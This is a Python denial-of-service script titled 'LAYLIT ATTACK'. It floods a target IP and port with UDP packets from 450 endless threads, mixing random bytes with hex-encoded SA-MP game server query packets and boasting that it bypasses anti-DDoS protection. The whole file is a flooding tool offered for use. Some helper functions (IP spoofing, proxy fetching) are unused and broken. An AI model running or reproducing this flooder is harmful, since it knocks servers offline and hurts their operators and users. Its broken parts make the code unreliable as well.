import socket, struct, codecs, sys, threading, random, time, os
ip = sys.argv[1]
port = sys.argv[2]
orgip = ip

Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]


referers = [
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR'
     'Your_Server_Bypassed_By_XXBR'
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR'
     'Your_Server_Bypassed_By_XXBR']

refers = [
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU'
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU',
     'ANTIDDOS_BYPASSED_BY_BAPAKLU']

os.system("clear")
print ("\033[32m                      ╔══════════════════════════════════════╗")
print ("\033[32m                      ║\033[33m ╦  ╔═╗╦ ╦╦  ╦╔╦╗\033[32m  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[32m║")
print ("\033[32m                      ║\033[33m ║  ╠═╣╚╦╝║  ║ ║ \033[32m  ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[32m║")
print ("\033[32m                      ║\033[33m ╩═╝╩ ╩ ╩ ╩═╝╩ ╩ \033[32m  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[32m║")
print ("\033[32m                      ╚══════════════════════════════════════╝")
print ("\033[32m                          ║\033[31m      LAYLIT ATTACK RUN        \033[32m║")
print ("\033[32m                       ╔════════════════════════════════════╗")                                   
print ("\033[32m                       ║\033[33m   IP TARGET    \033[32m║   \033[32m PORT TARGET    \033[32m║")
print ("\033[32m                       ║ ══════════════════════════════════ ║")
print ("\033[32m                       ║\033[31m %s\033[32m ║      \033[31m%s         \033[32m║"%(ip,port))  
print ("\033[32m                       ╚════════════════════════════════════╝")
print ("\033[32m                               ╔═══════════════════╗")
print ("\033[32m                               ║\033[31m    SUBS YT \033[37mXXBR   \033[32m║")
print ("\033[32m                               ╚═══════════════════╝")


def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  randip5 = random.randint(1,255)
  randip6 = random.randint(1,255)
  randip7 = random.randint(1,255)
  randip8 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  randip.append(randip5)
  randip.append(randip6)
  randip.append(randip7)
  randip.append(randip8)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    addr[4] = str(random.randrange(2, 256))
    addr[5] = str(random.randrange(2, 254))
    addr[6] = str(random.randrange(2, 256))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
    return assemebled

def getproxy():
    global proxies
    f = open(f'{nprox}.txt','wb')
    r = requests.get(urlproxy)
    f.write(r.content)
    f.close()
    proxies = open(f'{nprox}.txt').readlines()

def proxyask():
    global urlproxy
    pro = input(f'[~] Get New List {nprox} [Y] : ')
    if pro == "Y":
        urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
        urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
        getproxy()
        askthreads()
    else:
        proxyask()  

class MyThread(threading.Thread):

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1021)
            pack = random._urandom(666)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
                
  
if __name__ == '__main__':
    try:
        for x in range(450):
            mythread = MyThread()
            mythread.start()
            time.sleep(.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        print ('\n\n')
        print ('STOP TO ATTACK {}').format(orgip)
